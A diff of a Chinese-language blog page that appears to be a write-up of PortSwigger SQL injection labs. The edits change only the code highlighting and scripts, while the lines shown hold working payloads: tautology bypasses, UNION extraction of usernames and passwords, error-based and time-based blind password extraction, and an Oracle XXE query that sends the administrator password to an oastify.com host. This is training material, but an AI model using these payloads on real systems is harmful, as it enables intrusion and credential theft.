@@ -72,10 +72,6 @@
   
 
   
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
 
   <link
   rel="stylesheet"
@@ -83,7 +79,8 @@
   media="all"
 />
 
-</head><body>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
 
 
 
@@ -142,7 +139,7 @@
 <ul>
 <li>
 <p>数据库执行的 SQL 查询则为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <br><span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; AND released = 1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products </span><br><span class="line"><span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- &#x27; AND released = 1</span></span><br></pre></td></tr></table></figure>
 </li>
 <li>
 <p>通过<code>'</code>来闭合参数，<code>-- </code>来注释后半部分</p>
@@ -231,7 +228,7 @@
 <ul>
 <li>
 <p>后台 SQL 查询为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&amp;</span> <span class="hljs-keyword">from</span> products <br><span class="hljs-keyword">where</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- &#x27; AND released = 1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&amp;</span> <span class="keyword">from</span> products </span><br><span class="line"><span class="keyword">where</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users<span class="comment">-- &#x27; AND released = 1</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
@@ -286,7 +283,7 @@
 <ul>
 <li><code>' order by 3-- '</code>500，实践证明列数为 2</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- Oracle 查询数据库版本</span><br>Oracle    <span class="hljs-keyword">SELECT</span> banner <span class="hljs-keyword">FROM</span> v$version<br><br><span class="hljs-keyword">SELECT</span> version <span class="hljs-keyword">FROM</span> v$instance<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Oracle 查询数据库版本</span></span><br><span class="line">Oracle	<span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance</span><br></pre></td></tr></table></figure>
 </li>
 <li>
 <p>在 URL 或者 bp 软件中输入<code>' union select null,banner from v$version-- '</code></p>
@@ -595,12 +592,12 @@
 <ul>
 <li>
 <p><code>'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||'</code> --&gt; 500，验证条件（when (1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段<code>administrator</code></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">-- 1/0 会导致错误</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span></span><br><span class="line"><span class="keyword">when</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 1/0 会导致错误</span></span><br></pre></td></tr></table></figure>
 </li>
 <li>
 <blockquote>
 <p>CASE表达式可以在 SQL 中实现if-then-else型的逻辑</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> 判断语句<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> 返回<span class="hljs-number">1</span><br><span class="hljs-keyword">when</span> 判断语句<span class="hljs-number">2</span> <span class="hljs-keyword">then</span> 返回<span class="hljs-number">2</span><br>……<br><span class="hljs-keyword">else</span> 返回n<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span></span><br><span class="line"><span class="keyword">when</span> 判断语句<span class="number">1</span> <span class="keyword">then</span> 返回<span class="number">1</span></span><br><span class="line"><span class="keyword">when</span> 判断语句<span class="number">2</span> <span class="keyword">then</span> 返回<span class="number">2</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">else</span> 返回n</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 </blockquote>
 </li>
 </ul>
@@ -623,7 +620,7 @@
 </li>
 <li>
 <p><code>'||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||'</code></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span></span><br><span class="line"><span class="keyword">when</span> substr(password,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 </li>
 <li>
 <p>输出 http 状态码为 500 的时候，说明找到了密码</p>
@@ -646,7 +643,7 @@
 </li>
 <li>
 <p><code>'||(select pg_sleep(10))-- '</code> --&gt; 发现需要 10s 的响应时间</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> tracking<span class="hljs-operator">-</span>id <span class="hljs-keyword">from</span> tracking<span class="hljs-operator">-</span><span class="hljs-keyword">table</span><br><span class="hljs-keyword">where</span> trackingid<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pvhzsNX3X3hoWEpS&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">select</span> pg_sleep(<span class="hljs-number">10</span>))<span class="hljs-comment">-- &#x27;;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> tracking<span class="operator">-</span>id <span class="keyword">from</span> tracking<span class="operator">-</span><span class="keyword">table</span></span><br><span class="line"><span class="keyword">where</span> trackingid<span class="operator">=</span><span class="string">&#x27;pvhzsNX3X3hoWEpS&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> pg_sleep(<span class="number">10</span>))<span class="comment">-- &#x27;;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
@@ -700,8 +697,8 @@
 </ul>
 </li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="hljs-operator">&lt;</span>?xml version<span class="hljs-operator">=</span>&quot;1.0&quot; encoding<span class="hljs-operator">=</span>&quot;UTF-8&quot;?<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE root [ <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>ENTITY <span class="hljs-operator">%</span> remote <span class="hljs-keyword">SYSTEM</span> &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;<span class="hljs-operator">&gt;</span> <span class="hljs-operator">%</span>remote;]<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-operator">/</span>l<span class="hljs-string">&#x27;) FROM dual--</span><br></code></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">EXTRACTVALUE(xmltype(<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;</span>),<span class="hljs-string">&#x27;/l&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot; encoding<span class="operator">=</span>&quot;UTF-8&quot;?<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE root [ <span class="operator">&lt;</span><span class="operator">!</span>ENTITY <span class="operator">%</span> remote <span class="keyword">SYSTEM</span> &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;<span class="operator">&gt;</span> <span class="operator">%</span>remote;]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;) FROM dual--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(xmltype(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;</span>),<span class="string">&#x27;/l&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。</p>
 </blockquote>
@@ -710,7 +707,7 @@
 <ul>
 <li>依旧是上个题目的套路</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="hljs-operator">&lt;</span>?xml version<span class="hljs-operator">=</span>&quot;1.0&quot; encoding<span class="hljs-operator">=</span>&quot;UTF-8&quot;?<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE root [ <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>ENTITY <span class="hljs-operator">%</span> remote <span class="hljs-keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;<span class="hljs-operator">&gt;</span> <span class="hljs-operator">%</span>remote;]<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-operator">/</span>l<span class="hljs-string">&#x27;) FROM dual--</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot; encoding<span class="operator">=</span>&quot;UTF-8&quot;?<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE root [ <span class="operator">&lt;</span><span class="operator">!</span>ENTITY <span class="operator">%</span> remote <span class="keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;<span class="operator">&gt;</span> <span class="operator">%</span>remote;]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;) FROM dual--</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20SQL%20%E6%B3%A8%E5%85%A5/202410061754922.png" alt="image-20221227155023363"></p>
 <h3 id="通过-XML-3编码绕过过滤器的-SQL-注入"><strong>通过 XML 3编码绕过过滤器的 SQL 注入</strong></h3>
 <ul>
@@ -1212,28 +1209,16 @@
     }
   });
 </script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: ``,
-      };
-      utils.js('/js/plugins/copycode.js');
-    }
-  });
-</script>
+
 
 
                   <!-- inject -->
                   
 
-                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
                     <script>
                       hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
-                    </script><script src="/js/plugins/copycode.js"></script>
+                    </script> --><script src="/js/plugins/copycode.js"></script>
     <script type="text/javascript" 
       color="220,220,220" 
       opacity="0.7" 
